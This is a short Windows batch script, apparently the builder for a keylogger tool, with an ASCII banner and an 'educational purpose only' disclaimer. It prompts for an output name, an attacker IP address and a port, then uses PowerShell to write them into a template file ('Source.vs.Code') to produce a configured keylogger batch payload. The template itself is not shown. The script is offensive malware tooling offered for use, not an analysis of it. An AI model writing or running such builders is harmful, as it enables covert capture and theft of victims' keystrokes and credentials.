@echo off
@mode con cols=90 lines=35
:a       
cls   
echo 888       .d8888b.           888  .d8888b.   .d8888b.            .d8888b.          
echo 888      d88P  Y88b          888 d88P  Y88b d88P  Y88b          d88P  Y88b         
echo 888           .d88P          888 888    888 888    888               .d88P         
echo 888  888     8888"  888  888 888 888    888 888    888  .d88b.      8888"  888d888 
echo 888  88P      "Y8b. 888  888 888 888    888 888    888 d88P"88b      "Y8b. 888P"   
echo 888888K  888    888 888  888 888 888    888 888    888 888  888 888    888 888     
echo 888 "88b Y88b  d88P Y88b 888 888 Y88b  d88P Y88b  d88P Y88b 888 Y88b  d88P 888     
echo 888  888  "Y8888P"   "Y88888 888  "Y8888P"   "Y8888P"   "Y88888  "Y8888P"  888     
echo                          888                                888                    
echo                    Y8b d88P                           Y8b d88P                    
echo                     "Y88P"                             "Y88P"                     
color 0e
echo.
colorchar /4f "!!!!!!!!!!!!!!!!!!!!!!! Strictly For Educational Purpose Only !!!!!!!!!!!!!!!!!!!!!!!"
echo.
echo.
colorchar /f "Output Name (Eg:Keylogger): "
set /p output=
echo.
colorchar /c "IP Address (Eg:127.0.0.1): "
set /p ip=
echo.
colorchar /e "Port (Eg:4444): "
set /p port=
echo.
powershell -Command "(gc Source.vs.Code) -replace '_attackerip_', '%ip%' | Out-File -encoding ASCII 1.bat"
powershell -Command "(gc 1.bat) -replace '_attackerport_', '%port%' | Out-File -encoding ASCII 2.bat"
move 2.bat %output%.bat >nul
del 1.bat >nul
timeout /t 05 /NOBREAK >nul
goto a
